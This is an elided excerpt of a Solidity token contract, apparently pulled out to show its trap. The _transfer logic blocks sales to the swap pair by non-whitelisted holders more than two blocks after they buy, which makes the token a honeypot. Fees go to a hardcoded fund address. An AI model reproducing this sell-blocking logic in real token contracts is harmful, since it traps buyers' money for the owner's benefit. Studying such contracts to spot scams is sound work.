...
abstract contract AbsToken is IERC20, Ownable {
    ...
    mapping(address => uint256) public _transferList;
    ...
    constructor (
        ...
        fundAddress = 0x3d7acDBfEA9360C4330606a2bace5105d96F754e;
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (_transferList[from] + 2 < block.number) {
                    require(_swapPairList[from]);
                } 
                _transferList[to] = block.number;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0x3d7acDBfEA9360C4330606a2bace5105d96F754e;
